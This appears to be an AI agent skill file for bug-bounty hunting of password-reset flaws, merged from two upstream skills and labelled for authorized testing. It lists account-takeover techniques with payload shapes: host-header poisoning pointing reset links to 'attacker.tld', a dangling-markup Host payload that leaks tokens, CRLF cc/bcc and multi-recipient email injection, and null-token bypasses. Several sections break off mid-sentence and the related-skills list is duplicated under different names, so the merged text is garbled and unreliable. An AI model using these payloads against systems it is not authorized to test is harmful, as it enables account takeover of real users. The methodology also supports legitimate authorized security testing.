---
name: bbhunt-forgot-password
description: "Hunt username enumeration, token exposure, weak generation, reusable tokens and recovery flow abuse. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# Account-recovery flaw hunting — unified methodology

> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Autonomous Testing Priority

**Start with username enumeration — it's the fastest win and gates the rest.**

**Pattern 1 — Username enumeration (response difference for valid vs invalid email):**
1. POST to the forgot-password endpoint with a clearly invalid email (e.g. `nonexistent@fakedomain12345.com`) — record the response body, status code, and length
2. POST with an email you know exists (or try common patterns like `admin@target.com`, `test@target.com`, `user@target.com`)
3. Compare responses: different message ("Email sent" vs "Email not found"), different HTTP status, or meaningfully different body length = username enumeration confirmed
4. Proof: enumeration is confirmed when the two responses differ measurably (baseline vs probe) in message text, status code, or body length

**Pattern 2 — Reset token exposed in the API response:**
Some APIs return the reset token directly in the response body (instead of only emailing it). POST to the forgot-password endpoint and look for a token, link, or code in the JSON/HTML response. If a token appears that lets you reset the password, that's an immediate account-takeover vector.

**Pattern 3 — Reset token replay (reuse after use):**
1. Complete a full password reset cycle: request token → use it to reset password
2. Immediately try submitting the same token again to the reset-password endpoint
3. If the second submission returns 200 or "success" → token not invalidated after use

**Pattern 4 — No rate limit on reset requests:**
Submit the forgot-password endpoint 10-20 times rapidly with the same email. If all succeed wit

### Web-Research Methodology Additions (2026)

Research basis: the OWASP Forgot Password Cheat Sheet (general practices, URL tokens, recovery after compromise) and HackTricks "Reset/Forgotten Password Bypass." These are the current authoritative checklists; the items below are the attacker-side counterparts of the defenses they prescribe.

### A. Discovery checklist — concrete places, params, headers, flows to look

- **Map the whole flow, not just the first request.** Enumerate every hop: `POST /forgot-password` → `/validate-token` → `/reset-password` → `POST /api/account/reset` → `/resend-reset` → post-reset login. Many bugs live only in the second or third hop.
- **Token parameter names:** `token`, `resetToken`, `tempToken`, `recoveryCode`, `code`, `otp`, `pin`, `secret`, `key`, `sid`, `s`. Also check JWT-shaped tokens.
- **Target-account identifiers that should be server-derived but often are not:** `email`, `username`, `user`, `userId`, `user_id`, `accountId`, `login`, `id`, `uid`.
- **URL-construction inputs (poisoning surface):** `Host`, `X-Forwarded-Host`, `X-Host`, `X-Original-Host`, `Forwarded`, `X-Forwarded-Proto`; plus body/query `baseurl`, `base_url`, `return_to`, `redirect_uri`, `redirect_url`, `next`, `domain`, `tenant`, `siteUrl`.
- **Leak channels on the reset page:** outbound analytics/CDN/font/image requests carrying the token in `Referer`; check for a missing `Referrer-Policy: no-referrer` — OWASP explicitly requires it on token URLs.
- **Email-template sinks:** name/firstName/lastName, org/team/workspace/project name, invitation message, ticket title, file name — any field copied into a service-sent email.
- **Parallel/race surface:** "resend link" endpoints, token issue vs. token consume, and any "validate token" endpoint separate from "change password".
- **Wild endpoint spellings:** `hub/rpwd.php`, `/api/v1/account/forgot-password`, `/parents/application/v4/admin/doRegistrationEntries`

### Techniques, payloads and bypasses

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Host-header poisoning for link takeover.** Set `Host: attacker.tld` and override headers (`X-Forwarded-Host`, `Forwarded`, `X-Host`, `X-Original-Host`). OWASP says URLs must be hard-coded or allow-listed; a URL built from the header points at you. Note: mail-security scanners and preview services may auto-fetch the link, so the victim need not click.
- **Dangling markup in the Host port field** (when domain tampering 500s but an arbitrary non-numeric port is accepted): `Host: target.net:arbitraryport:'<a href="//attacker.tld/?` — breaks out of the string in the emailed URL and leaks the following token into your query string.
- **"Try using your token" (token/target decoupling).** Keep a token issued for *your* account, then swap the victim identifier in the final step: change `email`/`userId`/`username` only in the change-password request; or split flows so "validate token" uses yours and "change password" uses the victim's.
- **Multi-recipient email divergence.** `email=victim@x&email=attacker@x`; `email=victim@x%20email=attacker@x`; `email[]=victim@x&email[]=attacker@x`; JSON `{"email":["victim@x","attacker@x"]}` or nested `{"user":{"email":[...]}}`; comma lists; CRLF `cc:`/`bcc:` (`email="victim@x%0a%0dcc:attacker@x"`).
- **Missing "token was generated" check.** When the DB default is `NULL`/`""`, try `tempToken=null`, `""`, omit the field, and the literal string `"null"`. Especially effective on new accounts where `tokenExpiry` is initialized at signup.
- **Expired/replay on the API step.

### Validation and proof

### C. Validation / proof bar — how to confirm and avoid false positives

- **Gold standard:** request a reset for a test account you control, then actually change that account's password with the captured/forged token and log in. Nothing short of a state change is an ATO.
- **Enumeration:** require a reproducible, *server-state* difference across ≥20 samples. A generic "if the account exists, an email has been sent" is NOT enumeration; differing body length/status/verbatim text is. OWASP also requires uniform timing — measure medians, don't eyeball one request.
- **Poisoning:** an OOB Collaborator hit carrying the victim's *real* token is the proof. A modified link in an email you can read is only a prerequisite; demonstrate token capture from a victim-context request.
- **Race/reuse:** show two different passwords both accepted for one token, or the same consumed token working twice — not merely two 200s.
- **Avoid false positives:** (1) client-side response manipulation alone does not prove server-side misbehavior; (2) a token echoed into a response your own unauthenticated request triggered is high-severity, but a token visible only after login to the owner is expected; (3) an expired token accepted only on a UI step but rejected by the final API is not a finding; (4) "password stored in recoverable format" is a different class — report as such.
- **Post-reset hygiene (impact, not the bug):** confirm whether old sessions and outstanding reset links are invalidated; OWASP's recovery-after-compromise section makes this explicit.

- **Cross-account proof:** for identifier 

### Escalation and related chains

### Related Skills

- **`account-takeover`** — owns the account-takeover CHAIN (password-reset is its path #1). This skill finds/proves the recovery-flow primitive; hand off to account-takeover to assemble the full takeover.
- **`web-cache`** — host-header injection during reset email generation (different vulnerability, same flow)
- **`brute-force`** — rate-limit testing pattern applies to the reset endpoint too
- **`auth-bypass`** — if the reset flow can be skipped entirely (go to `/reset-password?token=` with empty/null token)
- **`mfa-and-passwords`** — if MFA is required after reset, test the bypass there

### Related Skills

- **`hunt-ato`** — owns the account-takeover CHAIN (password-reset is its path #1). This skill finds/proves the recovery-flow primitive; hand off to hunt-ato to assemble the full takeover.
- **`hunt-cache-poison`** — host-header injection during reset email generation (different vulnerability, same flow)
- **`hunt-brute-force`** — rate-limit testing pattern applies to the reset endpoint too
- **`hunt-auth-bypass`** — if the reset flow can be skipped entirely (go to `/reset-password?token=` with empty/null token)
- **`hunt-mfa-bypass`** — if MFA is required after reset, test the bypass there

## Source skills merged into this topic

- `hunting` — `forgot-password`
- `cbh` — `hunt-forgot-password`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `bbhunt-methodology` — orchestrator, state machine and class router
